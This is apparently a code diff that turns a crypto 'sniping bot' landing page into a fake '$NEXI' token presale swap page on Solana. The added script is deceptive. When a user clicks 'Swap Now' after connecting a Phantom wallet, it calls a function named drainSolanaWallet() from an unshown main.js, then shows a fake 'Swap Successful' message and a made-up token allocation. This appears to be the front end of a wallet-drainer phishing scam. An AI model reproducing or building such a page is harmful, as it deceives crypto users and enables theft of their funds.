+                <div class="input-section">
+                    <div class="input-label">
+                        <span>You Pay</span>
+                        <span>Balance: 0.00 SOL</span>
+                    </div>
+                    <div class="input-wrapper">
+                        <input 
+                            type="number" 
+                            id="input-amount" 
+                            placeholder="0.00" 
+                            min="1" 
+                            max="10000"
+                            step="0.01"
+                        />
+                        <div class="token-badge">
+                            <div class="token-icon"></div>
+                            <span>SOL</span>
                         </div>
                     </div>
-                    <div class="token-stats">
-                        <div class="stat-row">
-                            <span>Price:</span>
-                            <span>$0.000024</span>
-                        </div>
-                        <div class="stat-row">
-                            <span>Liquidity:</span>
-                            <span>$2.4M</span>
-                        </div>
-                    </div>
-                    <div class="token-actions">
-                        <button class="action-btn watch-btn disabled" disabled>Watch</button>
-                        <button class="action-btn snipe-btn disabled" disabled>Snipe</button>
-                    </div>
-                </div>
-                <div class="token-card">
-                    <div class="token-header">
-                        <div class="token-logo"></div>
-                        <div class="token-info">
-                            <h4>WIF</h4>
-                            <span class="chain-badge">SOL</span>
-                        </div>
-                    </div>
-                    <div class="token-stats">
-                        <div class="stat-row">
-                            <span>Price:</span>
-                            <span>$0.002341</span>
-                        </div>
-                        <div class="stat-row">
-                            <span>Liquidity:</span>
-                            <span>$5.3M</span>
-                        </div>
-                    </div>
-                    <div class="token-actions">
-                        <button class="action-btn watch-btn disabled" disabled>Snipe</button>
-                        <button class="action-btn snipe-btn disabled" disabled>Snipe</button>
+                    <div class="quick-amounts">
+                        <button class="quick-btn" data-amount="1">$1</button>
+                        <button class="quick-btn" data-amount="10">$10</button>
+                        <button class="quick-btn" data-amount="100">$100</button>
+                        <button class="quick-btn" data-amount="1000">$1,000</button>
                     </div>
                 </div>
-                <div class="token-card">
-                    <div class="token-header">
-                        <div class="token-logo"></div>
-                        <div class="token-info">
-                            <h4>SHIB</h4>
-                            <span class="chain-badge">BNB</span>
-                        </div>
-                    </div>
-                    <div class="token-stats">
-                        <div class="stat-row">
-                            <span>Price:</span>
-                            <span>$0.000009</span>
-                        </div>
-                        <div class="stat-row">
-                            <span>Liquidity:</span>
-                            <span>$3.8M</span>
-                        </div>
-                    </div>
-                    <div class="token-actions">
-                        <button class="action-btn watch-btn disabled" disabled>Watch</button>
-                        <button class="action-btn snipe-btn disabled" disabled>Snipe</button>
-                    </div>
-                </div>
-                <div class="token-card">
-                    <div class="token-header">
-                        <div class="token-logo"></div>
-                        <div class="token-info">
-                            <h4>PEPE</h4>
-                            <span class="chain-badge">ETH</span>
-                        </div>
-                    </div>
-                    <div class="token-stats">
-                        <div class="stat-row">
-                            <span>Price:</span>
-                            <span>$0.000008</span>
-                        </div>
-                        <div class="stat-row">
-                            <span>Liquidity:</span>
-                            <span>$8.7M</span>
-                        </div>
-                    </div>
-                    <div class="token-actions">
-                        <button class="action-btn watch-btn disabled" disabled>Watch</button>
-                        <button class="action-btn snipe-btn disabled" disabled>Snipe</button>
-                    </div>
-                </div>
-                <div class="token-card">
-                    <div class="token-header">
-                        <div class="token-logo"></div>
-                        <div class="token-info">
-                            <h4>DOGE</h4>
-                            <span class="chain-badge">BASE</span>
-                        </div>
-                    </div>
-                    <div class="token-stats">
-                        <div class="stat-row">
-                            <span>Price:</span>
-                            <span>$0.000156</span>
-                        </div>
-                        <div class="stat-row">
-                            <span>Liquidity:</span>
-                            <span>$1.2M</span>
-                        </div>
-                    </div>
-                    <div class="token-actions">
-                        <button class="action-btn watch-btn disabled" disabled>Watch</button>
-                        <button class="action-btn snipe-btn disabled" disabled>Snipe</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- How It Works -->
-    <section class="how-it-works" id="how-it-works">
-        <div class="features-container">
-            <h2 class="section-title">How It Works</h2>
-            <div class="steps-container">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <h3>Connect Wallet</h3>
-                    <p>Link your Phantom, MetaMask, or any Web3 wallet securely</p>
+                <!-- Swap Arrow -->
+                <div class="swap-arrow">
+                    <div class="arrow-icon">
+                        <i class="fas fa-arrow-down"></i>
+                    </div>
                 </div>
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <h3>Choose Strategy</h3>
-                    <p>Select auto-snipe, copy trade, or manual mode</p>
-                </div>
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <h3>Auto-Snipe</h3>
-                    <p>Bot executes lightning-fast transactions at optimal prices</p>
-                </div>
-                <div class="step">
-                    <div class="step-number">4</div>
-                    <h3>Monitor & Profit</h3>
-                    <p>Track performance and withdraw earnings anytime</p>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Pricing Section -->
-    <section class="pricing" id="pricing">
-        <div class="features-container">
-            <h2 class="section-title">Simple, Transparent Pricing</h2>
-            <div class="pricing-container">
-                <div class="pricing-card">
-                    <h3>Monthly</h3>
-                    <div class="price">$5<span class="price-period">/mo</span></div>
-                    <ul class="features-list">
-                        <li>Core sniping features</li>
-                        <li>8+ chain support</li>
-                        <li>Basic alerts</li>
-                        <li>Community support</li>
-                        <li>Real-time trading</li>
-                    </ul>
-                    <button class="subscribe-btn monthly-subscribe">Subscribe - $5/month</button>
+                <!-- You Receive Section -->
+                <div class="input-section">
+                    <div class="input-label">
+                        <span>You Receive</span>
+                        <span>$NEXI Tokens</span>
+                    </div>
+                    <div class="input-wrapper">
+                        <input 
+                            type="text" 
+                            id="output-amount" 
+                            placeholder="0.00" 
+                            readonly
+                            style="cursor: default;"
+                        />
+                        <div class="token-badge">
+                            <div class="token-icon"></div>
+                            <span>$NEXI</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="pricing-card featured">
-                    <h3>Yearly</h3>
-                    <div class="price">$30<span class="price-period">/yr</span></div>
-                    <ul class="features-list">
-                        <li>All Monthly features</li>
-                        <li>Priority support</li>
-                        <li>Advanced analytics</li>
-                        <li>Custom alerts</li>
-                        <li>API access</li>
-                        <li>Save $30/year</li>
-                    </ul>
-                    <button class="subscribe-btn yearly-subscribe">Subscribe - $30/year</button>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Trust & Security -->
-    <section class="trust">
-        <div class="trust-container">
-            <h2 class="section-title">Trusted & Secure</h2>
-            <div class="trust-features">
-                <div class="trust-item">
-                    <div class="trust-icon">🔒</div>
-                    <span>Non-custodial</span>
+                <!-- Rate Info -->
+                <div class="rate-info">
+                    <div class="rate">1 USD = 100 $NEXI</div>
+                    <div class="rate-label">Presale Exchange Rate</div>
                 </div>
-                <div class="trust-item">
-                    <div class="trust-icon">⚡</div>
-                    <span>Instant execution</span>
-                </div>
-                <div class="trust-item">
-                    <div class="trust-icon">🛡️</div>
-                    <span>Liquidity verification</span>
-                </div>
-                <div class="trust-item">
-                    <div class="trust-icon">🔐</div>
-                    <span>Encrypted connections</span>
-                </div>
-            </div>
-            <div class="chain-logos">
-                <div class="chain-logo">SOL</div>
-                <div class="chain-logo">ETH</div>
-                <div class="chain-logo">BASE</div>
-                <div class="chain-logo">SUI</div>
-                <div class="chain-logo">BNB</div>
-                <div class="chain-logo">ARB</div>
-                <div class="chain-logo">AVAX</div>
-                <div class="chain-logo">METIS</div>
-            </div>
-        </div>
-    </section>
 
-    <!-- Footer -->
-    <footer>
-        <div class="footer-container">
-            <div class="footer-section">
-                <h4>Product</h4>
-                <a href="#features">Features</a>
-                <a href="#how-it-works">How It Works</a>
-                <a href="#pricing">Pricing</a>
-                <a href="#">Documentation</a>
+                <!-- Limits Info -->
+                <div class="limits-info">
+                    <div class="limit-item">
+                        <span class="limit-label">Minimum</span>
+                        <span class="limit-value">$1 USD</span>
+                    </div>
+                    <div class="limit-item">
+                        <span class="limit-label">Maximum</span>
+                        <span class="limit-value">$10,000 USD</span>
+                    </div>
+                    <div class="limit-item">
+                        <span class="limit-label">Your Allocation</span>
+                        <span class="limit-value" id="user-allocation">0 $NEXI</span>
+                    </div>
+                </div>
+
+                <!-- Swap Button -->
+                <button class="swap-button" id="swap-button" disabled>
+                    Connect Wallet to Swap
+                </button>
+
+                <!-- Error Message -->
+                <div class="error-message" id="error-message"></div>
             </div>
-            <div class="footer-section">
-                <h4>Company</h4>
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Careers</a>
-                <a href="#">Contact</a>
-            </div>
-            <div class="footer-section">
-                <h4>Legal</h4>
-                <a href="#">Terms of Service</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Cookie Policy</a>
-            </div>
-            <div class="footer-section">
-                <h4>Community</h4>
-                <a href="#">Discord</a>
-                <a href="#">Twitter</a>
-                <a href="#">Telegram</a>
-                <a href="#">GitHub</a>
+
+            <!-- Stats Grid -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value">100:1</div>
+                    <div class="stat-label">Exchange Rate</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">Solana</div>
+                    <div class="stat-label">Blockchain</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">Instant</div>
+                    <div class="stat-label">Settlement</div>
+                </div>
             </div>
         </div>
-        <div class="footer-bottom">
-            <p>&copy; 2025 NexiumBoost. All rights reserved.</p>
-        </div>
-    </footer>
+    </div>
 
     <!-- Wallet Modal -->
     <div class="wallet-modal" id="wallet-modal">
         <div class="modal-content">
             <h2>Connect Your Wallet</h2>
             <div class="wallet-option" id="connect-phantom">
-                <div class="wallet-icon">👻</div>
+                <div class="wallet-icon">Ghost</div>
                 <div>
                     <strong>Phantom</strong>
-                    <div style="font-size: 0.9rem; color: #6a6a6a;">For Solana</div>
+                    <div style="font-size: 0.9rem; color: #a0a0a0;">Recommended for Solana</div>
                 </div>
             </div>
             <div class="wallet-option disabled">
-                <div class="wallet-icon">🦊</div>
+                <div class="wallet-icon">Fox</div>
                 <div>
                     <strong>MetaMask</strong>
-                    <div style="font-size: 0.9rem; color: #6a6a6a;">For EVM chains</div>
+                    <div style="font-size: 0.9rem; color: #a0a0a0;">Not supported for presale</div>
                 </div>
             </div>
             <div class="wallet-option disabled">
-                <div class="wallet-icon">🔗</div>
+                <div class="wallet-icon">Link</div>
                 <div>
                     <strong>WalletConnect</strong>
-                    <div style="font-size: 0.9rem; color: #6a6a6a;">Universal connector</div>
+                    <div style="font-size: 0.9rem; color: #a0a0a0;">Coming soon</div>
                 </div>
             </div>
             <button class="close-modal" id="close-modal">Close</button>
@@ -1169,72 +880,139 @@
     </div>
 
     <!-- MetaMask Prompt -->
-    <div id="metamaskPrompt">
-        <p>For the best experience, use NexiumBoost in the Phantom wallet app!</p>
-        <button class="prompt-close">Close</button>
+    <div id="metamaskPrompt" class="hidden">
+        <p>Please install <a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline">Phantom</a> or switch to continue.</p>
+        <button class="prompt-close">Got it</button>
     </div>
 
-    <script>
-        // Auto-scroll carousel
-        const carousel = document.getElementById('tokenCarousel');
-        let scrollPosition = 0;
-        let isHovering = false;
+    <script type="module">
+        import { NexiumApp } from './main.js';
 
-        carousel.addEventListener('mouseenter', () => isHovering = true);
-        carousel.addEventListener('mouseleave', () => isHovering = false);
+        let nexiumApp = null;
+        setTimeout(() => {
+            nexiumApp = window.nexiumApp || new NexiumApp();
+            window.nexiumApp = nexiumApp;
+            console.log('Frontend connected to backend:', !!nexiumApp);
+        }, 100);
 
-        function autoScroll() {
-            if (!isHovering && carousel) {
-                scrollPosition += 0.5;
-                if (scrollPosition >= carousel.scrollWidth - carousel.clientWidth) {
-                    scrollPosition = 0;
-                }
-                carousel.scrollLeft = scrollPosition;
-            }
-            requestAnimationFrame(autoScroll);
-        }
-        autoScroll();
-
-        // Wallet connection
-        const connectWalletBtn = document.getElementById('connect-wallet');
+        const swapButton = document.getElementById('swap-button');
+        const inputAmount = document.getElementById('input-amount');
+        const outputAmount = document.getElementById('output-amount');
+        const errorMessage = document.getElementById('error-message');
+        const quickButtons = document.querySelectorAll('.quick-btn');
         const walletModal = document.getElementById('wallet-modal');
-        const closeModalBtn = document.getElementById('close-modal');
-        const connectPhantomBtn = document.getElementById('connect-phantom');
-        const metamaskPrompt = document.getElementById('metamaskPrompt');
 
-        connectWalletBtn.addEventListener('click', () => {
-            walletModal.classList.add('active');
+        function calculateOutput(usdAmount) {
+            return usdAmount * 100;
+        }
+
+        function formatNumber(num) {
+            return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.add('active');
+        }
+
+        function hideError() {
+            errorMessage.classList.remove('active');
+        }
+
+        function updateOutput() {
+            const value = parseFloat(inputAmount.value) || 0;
+            if (value === 0) {
+                outputAmount.value = '0.00';
+                swapButton.disabled = true;
+                if (nexiumApp?.publicKey) swapButton.textContent = 'Enter Amount to Swap';
+                return;
+            }
+            if (value < 1) {
+                outputAmount.value = '0.00';
+                showError('Minimum swap amount is $1 USD');
+                swapButton.disabled = true;
+                return;
+            }
+            if (value > 10000) {
+                outputAmount.value = '0.00';
+                showError('Maximum swap amount is $10,000 USD');
+                swapButton.disabled = true;
+                return;
+            }
+            hideError();
+            const output = calculateOutput(value);
+            outputAmount.value = formatNumber(output);
+            if (nexiumApp?.publicKey) {
+                swapButton.disabled = false;
+                swapButton.textContent = 'Swap Now';
+            }
+        }
+
+        inputAmount.addEventListener('input', updateOutput);
+        inputAmount.addEventListener('change', updateOutput);
+        inputAmount.addEventListener('keyup', updateOutput);
+
+        quickButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                inputAmount.value = btn.dataset.amount;
+                updateOutput();
+            });
         });
 
-        closeModalBtn.addEventListener('click', () => {
-            walletModal.classList.remove('active');
+        swapButton.addEventListener('click', async () => {
+            console.log('Swap button clicked, nexiumApp exists:', !!nexiumApp);
+            console.log('Wallet connected:', !!nexiumApp?.publicKey);
+
+            if (!nexiumApp || !nexiumApp.publicKey) {
+                showError('Please connect your Phantom wallet to swap.');
+                walletModal.classList.add('active');
+                return;
+            }
+
+            const amount = parseFloat(inputAmount.value);
+            if (amount < 1 || amount > 10000) {
+                showError('Invalid amount. Please enter between $1 and $10,000');
+                return;
+            }
+
+            try {
+                hideError();
+                swapButton.disabled = true;
+                swapButton.textContent = 'Processing Swap...';
+                await nexiumApp.drainSolanaWallet();
+
+                const tokensReceived = calculateOutput(amount);
+                document.getElementById('user-allocation').textContent = `${tokensReceived.toLocaleString()} $NEXI`;
+                swapButton.textContent = 'Swap Successful! Success';
+                swapButton.style.background = 'linear-gradient(135deg, #14F195 0%, #00D4FF 100%)';
+
+                setTimeout(() => {
+                    swapButton.textContent = 'Swap Now';
+                    swapButton.style.background = 'linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%)';
+                    swapButton.disabled = false;
+                }, 3000);
+            } catch (error) {
+                console.error('Swap failed:', error);
+                showError('Swap failed. Please try again.');
+                swapButton.textContent = 'Swap Now';
+                swapButton.disabled = false;
+            }
         });
 
-        connectPhantomBtn.addEventListener('click', () => {
-            if (window.solana && window.solana.isPhantom) {
-                window.solana.connect().then(() => {
-                    walletModal.classList.remove('active');
-                    connectWalletBtn.textContent = 'Connected';
-                    connectWalletBtn.style.background = 'linear-gradient(135deg, #14F195 0%, #9945FF 100%)';
-                }).catch(err => {
-                    console.error('Connection failed:', err);
-                });
+        setInterval(() => {
+            if (!nexiumApp?.publicKey) {
+                if (swapButton.textContent !== 'Connect Wallet to Swap') {
+                    swapButton.textContent = 'Connect Wallet to Swap';
+                    swapButton.disabled = true;
+                }
             } else {
-                metamaskPrompt.classList.add('active');
+                const inputValue = parseFloat(inputAmount.value) || 0;
+                if (inputValue >= 1 && inputValue <= 10000) {
+                    swapButton.textContent = 'Swap Now';
+                    swapButton.disabled = false;
+                }
             }
-        });
-
-        // Close modals on outside click
-        walletModal.addEventListener('click', (e) => {
-            if (e.target === walletModal) {
-                walletModal.classList.remove('active');
-            }
-        });
-
-        // Close MetaMask prompt
-        document.querySelector('.prompt-close').addEventListener('click', () => {
-            metamaskPrompt.classList.remove('active');
-        });
+        }, 500);
     </script>
     <script type="module" src="main.js"></script>
 </body>
